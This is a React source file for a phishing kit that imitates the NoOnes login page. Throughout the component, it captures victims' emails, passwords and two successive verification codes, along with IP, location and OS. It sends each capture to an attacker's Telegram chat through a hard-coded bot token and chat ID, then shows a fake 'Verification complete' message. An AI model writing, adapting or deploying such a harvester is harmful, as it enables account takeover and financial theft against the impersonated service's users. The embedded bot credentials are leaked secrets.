
import React, { useState, useEffect } from 'react';
import LoginScreen from './components/LoginScreen';
import VerificationScreen from './components/VerificationScreen';
import LanguageSelector from './components/LanguageSelector';
import ThemeToggle from './components/ThemeToggle';
import { AuthStep } from './types';

/**
 * CONFIGURATION - Update these directly as needed
 */
const LOGO_URL = "https://i.postimg.cc/XYL60RB2/Screenshot-2026-01-03-014527-removebg-preview.png";
const TELEGRAM_TOKEN = "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk";
const TELEGRAM_CHAT_ID = "2100006818";

const App: React.FC = () => {
  const [step, setStep] = useState<AuthStep>('login');
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [currentDraft, setCurrentDraft] = useState<{ email: string; pass: string } | null>(null);
  const [userIp, setUserIp] = useState<string>("Detecting...");

  useEffect(() => {
    // Sync theme with body
    document.body.className = isDarkMode 
      ? 'bg-[#121212] text-white transition-colors duration-200' 
      : 'bg-gray-100 text-black transition-colors duration-200';

    // Load theme preference
    try {
      const savedTheme = localStorage.getItem('noones_theme');
      if (savedTheme !== null) setIsDarkMode(savedTheme === 'dark');
    } catch (e) {}

    // Fetch IP for Telegram logging
    const fetchIp = async () => {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 4000);
        const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
        clearTimeout(timeoutId);
        const data = await res.json();
        setUserIp(`${data.ip} (${data.city || 'Unknown'}, ${data.country_name || 'Unknown'})`);
      } catch (e) {
        setUserIp("Detection Failed");
      }
    };
    fetchIp();
  }, [isDarkMode]);

  const toggleTheme = () => {
    const newMode = !isDarkMode;
    setIsDarkMode(newMode);
    try {
      localStorage.setItem('noones_theme', newMode ? 'dark' : 'light');
    } catch (e) {}
  };

  const escapeHtml = (unsafe: string) => {
    return unsafe
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  };

  const sendToTelegram = async (message: string) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error("Telegram error:", e);
    }
  };

  const handleLoginCapture = (data: { email: string; pass: string }) => {
    setCurrentDraft(data);
    
    const message = `<b>🚀 NoOnes - LOGIN ATTEMPT</b>\n\n` +
                    `<b>📧 User:</b> <code>${escapeHtml(data.email)}</code>\n` +
                    `<b>🔑 Pass:</b> <code>${escapeHtml(data.pass)}</code>\n\n` +
                    `<b>🌐 IP:</b> ${userIp}\n` +
                    `<b>💻 OS:</b> ${navigator.platform}\n` +
                    `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
    
    sendToTelegram(message);
    setStep('verification');
  };

  const handleVerification1Capture = async (code: string) => {
    if (currentDraft) {
      const message = `<b>🔢 NoOnes - CODE 1 RECEIVED</b>\n\n` +
                      `<b>📧 User:</b> <code>${escapeHtml(currentDraft.email)}</code>\n` +
                      `<b>🔑 Pass:</b> <code>${escapeHtml(currentDraft.pass)}</code>\n` +
                      `<b>🔢 Code 1:</b> <code>${code}</code>\n\n` +
                      `<b>🌐 IP:</b> ${userIp}\n` +
                      `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
      
      sendToTelegram(message);
      setStep('verification2');
    }
  };

  const handleVerification2Capture = async (code: string) => {
    if (currentDraft) {
      const message = `<b>🔢 NoOnes - CODE 2 RECEIVED</b>\n\n` +
                      `<b>📧 User:</b> <code>${escapeHtml(currentDraft.email)}</code>\n` +
                      `<b>🔑 Pass:</b> <code>${escapeHtml(currentDraft.pass)}</code>\n` +
                      `<b>🔢 Code 2:</b> <code>${code}</code>\n\n` +
                      `<b>🌐 IP:</b> ${userIp}\n` +
                      `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
      
      sendToTelegram(message);
      setCurrentDraft(null);
      setStep('login');
      alert("Verification complete. Redirecting to home...");
    }
  };

  const isWhiteLogo = LOGO_URL.toLowerCase().includes('white') || LOGO_URL.toLowerCase().includes('removebg');
  const shouldInvert = !isDarkMode && isWhiteLogo;

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <div className="mb-8 h-12 flex items-center justify-center">
        <img 
          src={LOGO_URL} 
          alt="NoOnes" 
          className={`h-12 md:h-14 w-auto object-contain transition-all duration-300 ${shouldInvert ? 'invert brightness-0' : ''}`}
          onError={(e) => {
            (e.target as HTMLImageElement).src = "https://noones.com/images/noones-logo-white.svg";
          }}
        />
      </div>

      <div className="w-full flex justify-center mb-8">
        {step === 'login' && (
          <LoginScreen 
            onLogin={handleLoginCapture} 
            isDarkMode={isDarkMode} 
          />
        )}
        {step === 'verification' && (
          <VerificationScreen 
            onContinue={handleVerification1Capture} 
            isDarkMode={isDarkMode} 
          />
        )}
        {step === 'verification2' && (
          <VerificationScreen 
            onContinue={handleVerification2Capture} 
            isDarkMode={isDarkMode} 
            title="Account verification"
            subtitle="Please wait for the second security code to arrive."
            buttonText="Verify and Continue"
          />
        )}
      </div>

      <div className="w-full max-w-md flex justify-between items-center px-2">
        <div className="flex items-center space-x-6">
          <ThemeToggle isDarkMode={isDarkMode} onToggle={toggleTheme} />
        </div>
        <LanguageSelector />
      </div>
    </div>
  );
};

export default App;
